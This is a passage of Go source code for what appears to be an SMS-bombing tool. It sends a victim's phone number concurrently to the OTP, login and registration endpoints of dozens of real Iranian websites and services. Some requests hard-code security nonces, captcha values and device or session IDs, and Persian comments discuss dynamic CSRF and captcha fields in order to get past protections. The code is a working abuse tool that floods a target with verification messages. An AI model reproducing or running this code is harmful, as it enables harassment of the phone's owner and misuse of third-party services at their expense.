            "phoneNumber": phone,
            "os": "Windows",
            "osVersion": "10",
            "browser": "Chrome",
            "browserVersion": "135.0.0.0", // این ورژن ممکن است نیاز به بروزرسانی داشته باشد
            "device": "",
            "presenterCode": "",
        }
        sendJSONRequest(ctx, "https://app.ezpay.ir:8443/open/v1/user/validation-code", payload, &wg, ch)
    }

    // api.motabare.ir
    wg.Add(1)
    tasks <- func() {
        // اصلاح نوع payload به map[string]interface{}
        payload := map[string]interface{}{
            "mobile": phone,
        }
        sendJSONRequest(ctx, "https://api.motabare.ir/v1/core/user/initial/", payload, &wg, ch)
    }

    // oteacher.org (شامل پارامترهای دینامیک client, timestamp, sign)
    wg.Add(1)
    tasks <- func() {
        // اصلاح نوع payload به map[string]interface{}
        payload := map[string]interface{}{
            // "client": "xLjNuxt%2z@", // ممکن است دینامیک باشد
            "mobile": phone,
            // "timestamp": time.Now().UnixNano() / int64(time.Millisecond), // شاید نیاز به timestamp فعلی باشد (عدد است)
            // "sign": "DYNAMIC_VALUE", // این پارامتر دینامیک است و ممکن است مشکل ایجاد کند
        }
         sendJSONRequest(ctx, "https://oteacher.org/api/user/register/mobile", payload, &wg, ch)
    }


    // اضافه کردن وظایف برای URLهای Form Data (این قسمت نیازی به تغییر نوع payload ندارد چون Form Data همیشه کلید-مقدار رشته‌ای است)



    // fankala.com (شامل پارامترهای دینامیک csrf, g-recaptcha-response, dig_nounce)
    wg.Add(1)
    tasks <- func() {
        formData := url.Values{}
        formData.Set("action", "digits_check_mob")
        formData.Set("countrycode", "+98") // یا بر اساس نیاز، ممکن است نیاز به منطق پیچیده تر برای کد کشور باشد
        formData.Set("mobileNo", phone[1:]) // حذف صفر اول
        // formData.Set("csrf", "DYNAMIC_VALUE") // این پارامتر دینامیک است
        formData.Set("login", "2")
        formData.Set("username", "")
        formData.Set("email", "")
        // formData.Set("captcha", "") // ممکن است نیاز به کپچا داشته باشد
        // formData.Set("captcha_ses", "")
        formData.Set("digits", "1")
        formData.Set("json", "1")
        formData.Set("whatsapp", "0")
        formData.Set("digits_reg_name", "Test Name") // می‌تواند ثابت یا تصادفی باشد
        formData.Set("digregcode", "+98")
        formData.Set("digits_reg_mail", phone[1:]) // حذف صفر اول
        formData.Set("digregscode2", "+98")
        formData.Set("mobmail2", "")
        formData.Set("digits_reg_password", "")
        // formData.Set("g-recaptcha-response", "DYNAMIC_VALUE") // این پارامتر دینامیک است
        // formData.Set("gglcptch", "")
        formData.Set("dig_otp", "")
        formData.Set("code", "")
        formData.Set("dig_reg_mail", "")
        // formData.Set("dig_nounce", "DYNAMIC_VALUE") // این پارامتر دینامیک است
        sendFormRequest(ctx, "https://fankala.com/wp-admin/admin-ajax.php", formData, &wg, ch)
    }


    // arastag.ir (شامل پارامتر دینامیک security)
    wg.Add(1)
    tasks <- func() {
        formData := url.Values{}
        formData.Set("action", "mreeir_send_sms")
        formData.Set("mobileemail", phone)
        formData.Set("userisnotauser", "")
        formData.Set("type", "mobile")
        // formData.Set("security", "DYNAMIC_VALUE") // این پارامتر دینامیک است
        sendFormRequest(ctx, "https://arastag.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
    }

    // zzzagros.com (شامل پارامتر دینامیک nonce)
    wg.Add(1)
    tasks <- func() {
        formData := url.Values{}
        formData.Set("action", "awsa-login-with-phone-send-code")
        // formData.Set("nonce", "DYNAMIC_VALUE") // این پارامتر دینامیک است
        formData.Set("username", phone)
        sendFormRequest(ctx, "https://www.zzzagros.com/wp-admin/admin-ajax.php", formData, &wg, ch)
    }

    // hamrahsport.com
    wg.Add(1)
    tasks <- func() {
        formData := url.Values{}
        formData.Set("cell", phone)
        formData.Set("name", "Test Name") // می‌توانید تغییر دهید یا تصادفی کنید
        formData.Set("agree", "1")
        formData.Set("send_otp", "1")
        formData.Set("otp", "")
        sendFormRequest(ctx, "https://hamrahsport.com/send-otp", formData, &wg, ch)
    }

    // elecmake.com (شامل پارامتر دینامیک security)
    wg.Add(1)
    tasks <- func() {
        formData := url.Values{}
        formData.Set("action", "vooroodak__submit-username")
        formData.Set("username", phone)
        // formData.Set("security", "DYNAMIC_VALUE") // این پارامتر دینامیک است
        sendFormRequest(ctx, "https://elecmake.com/wp-admin/admin-ajax.php", formData, &wg, ch)
    }

    // roustaee.com (شامل پارامترهای دینامیک csrf, captcha, dig_nounce)
    wg.Add(1)
    tasks <- func() {
        formData := url.Values{}
        formData.Set("action", "digits_check_mob")
        formData.Set("countrycode", "+98")
        formData.Set("mobileNo", phone[1:]) // حذف صفر اول
        // formData.Set("csrf", "DYNAMIC_VALUE") // دینامیک
        formData.Set("login", "1")
        formData.Set("username", "")
        formData.Set("email", "")
        // formData.Set("captcha", "") // ممکن است نیاز به کپچا داشته باشد
        // formData.Set("captcha_ses", "")
        formData.Set("digits", "1")
        formData.Set("json", "1")
        formData.Set("whatsapp", "0")
        formData.Set("mobmail", phone[1:]) // حذف صفر اول
        formData.Set("dig_otp", "")
        formData.Set("rememberme", "1")
        // formData.Set("dig_nounce", "DYNAMIC_VALUE") // دینامیک
        sendFormRequest(ctx, "https://roustaee.com/wp-admin/admin-ajax.php", formData, &wg, ch)
    }

    // nazarkade.com - check.mobile.php
    wg.Add(1)
    tasks <- func() {
        formData := url.Values{}
        formData.Set("countryCode", "+98")
        formData.Set("mobile", phone[1:]) // حذف صفر اول
        sendFormRequest(ctx, "https://nazarkade.com/wp-content/plugins/Archive//api/check.mobile.php", formData, &wg, ch)
    }

     // nazarkade.com - admin-ajax.php (شامل پارامترهای دینامیک csrf, captcha, dig_nounce)
    wg.Add(1)
    tasks <- func() {
        formData := url.Values{}
        formData.Set("action", "digits_check_mob")
        formData.Set("countrycode", "+98")
        formData.Set("mobileNo", phone[1:]) // حذف صفر اول
        // formData.Set("csrf", "DYNAMIC_VALUE") // دینامیک
        formData.Set("login", "2")
        formData.Set("username", "")
        formData.Set("email", "")
        // formData.Set("captcha", "") // ممکن است نیاز به کپچا داشته باشد
        // formData.Set("captcha_ses", "")
        formData.Set("digits", "1")
        formData.Set("json", "1")
        formData.Set("whatsapp", "0")
        formData.Set("digregcode", "+98")
        formData.Set("digits_reg_mail", phone[1:]) // حذف صفر اول
        formData.Set("digits_reg_password", "x") // ثابت یا تغییر دهید
        formData.Set("digits_reg_name", "x") // ثابت یا تغییر دهید
        formData.Set("dig_otp", "")
        formData.Set("code", "")
        formData.Set("dig_reg_mail", "")
        // formData.Set("dig_nounce", "DYNAMIC_VALUE") // دینامیک
        sendFormRequest(ctx, "https://nazarkade.com/wp-admin/admin-ajax.php", formData, &wg, ch)
    }

    // api.snapp.express (شامل پارامترهای دینامیک و کوئری پارامتر در URL)
    wg.Add(1)
    tasks <- func() {
        formData := url.Values{}
        formData.Set("cellphone", phone)
        formData.Set("client", "PWA") // اینها ممکن است ثابت باشند
        formData.Set("optionalClient", "PWA")
        formData.Set("deviceType", "PWA")
        formData.Set("appVersion", "5.6.6") // ممکن است نیاز به بروزرسانی داشته باشد
        formData.Set("clientVersion", "a4547bd9") // ممکن است نیاز به بروزرسانی داشته باشد
        formData.Set("optionalVersion", "5.6.6") // ممکن است نیاز به بروزرسانی داشته باشد
        // formData.Set("UDID", "DYNAMIC_VALUE") // دینامیک
        // formData.Set("sessionId", "DYNAMIC_VALUE") // دینامیک
        formData.Set("lat", "35.774") // ممکن است نیاز به تغییر داشته باشد
        formData.Set("long", "51.418") // ممکن است نیاز به تغییر داشته باشد
        // formData.Set("captcha", "DYNAMIC_VALUE") // دینامیک
        formData.Set("optionalLoginToken", "true") // ممکن است ثابت باشد

        // کوئری پارامترها در URL هم وجود دارند که با این تابع sendFormRequest ارسال می شوند
        urlWithQuery := "https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass?client=PWA&optionalClient=PWA&deviceType=PWA&appVersion=5.6.6&clientVersion=a4547bd9&optionalVersion=5.6.6&UDID=2bb22fca-5212-47dd-9ff5-e6909df17d6b&sessionId=dc36a2df-587e-412f-96cd-d483d58e3daf&lat=35.774&long=51.418"
        sendFormRequest(ctx, urlWithQuery, formData, &wg, ch)
    }

 // Original sabziman.com
			wg.Add(1)
			tasks <- func() {
				formData := url.Values{}
				formData.Set("action", "newphoneexist")
				formData.Set("phonenumber", phone) // شماره کامل
				sendFormRequest(ctx, "https://sabziman.com/wp-admin/admin-ajax.php", formData, &wg, ch)
			}

			// technolife.com (POST JSON)
			wg.Add(1)
			tasks <- func() {
				payload := map[string]interface{}{
					"operationName": "check_customer_exists",
					"query":         "query check_customer_exists ($username: String, $repeat: Boolean) { check_customer_exists (username: $username, repeat: $repeat) { result request_id } }",
					"variables": map[string]interface{}{
						"username": phone, // شماره کامل
					},
				}
				sendJSONRequest(ctx, "https://www.technolife.com/shop_customer", payload, &wg, ch)
			}

			// anbaronline.ir (POST Form)
			wg.Add(1)
			tasks <- func() {
				formData := url.Values{}
				formData.Set("mobile", phone)      // شماره کامل
				formData.Set("captchai", "59")     // مقدار ثابت
				sendFormRequest(ctx, "https://www.anbaronline.ir/account/sendotpjson", formData, &wg, ch)
			}

			// ebcom.mci.ir (POST JSON)
			wg.Add(1)
			tasks <- func() {
				payload := map[string]interface{}{
					"msisdn": getPhoneNumberNoZero(phone), // شماره بدون صفر اول
				}
				sendJSONRequest(ctx, "https://ebcom.mci.ir/services/auth/v1.0/otp", payload, &wg, ch)
			}

			// asangem.com (POST Form)
			wg.Add(1)
			tasks <- func() {
				formData := url.Values{}
				formData.Set("action", "mreeir_send_sms")
				formData.Set("mobileemail", getPhoneNumberNoZero(phone)) // شماره بدون صفر اول
				formData.Set("userisnotauser", "")
				formData.Set("type", "mobile")
				formData.Set("security", "cb94fb1738") // مقدار ثابت (ممکن است نیاز به تغییر داشته باشد)
				sendFormRequest(ctx, "https://asangem.com/wp-admin/admin-ajax.php", formData, &wg, ch)
			}

			// mehreganit.com (POST Form)
			wg.Add(1)
			tasks <- func() {
				formData := url.Values{}
				formData.Set("action", "validate_and_action")
				formData.Set("mobile", phone) // شماره کامل
				formData.Set("username", "")
				formData.Set("security", "c9a8393a08") // مقدار ثابت (ممکن است نیاز به تغییر داشته باشد)
				sendFormRequest(ctx, "https://mehreganit.com/wp-admin/admin-ajax.php", formData, &wg, ch)
			}

	} // --- پایان حلقه اصلی برای اضافه کردن وظایف ---


	close(tasks)

	go func() {
		wg.Wait()
		close(ch)
	}()

	// پردازش نتایج
	for statusCode := range ch {
		if statusCode >= 400 || statusCode == 0 {
			fmt.Println("\033[01;31m[-] Error or Canceled!")
		} else {
			fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSended")
		}
	}
}
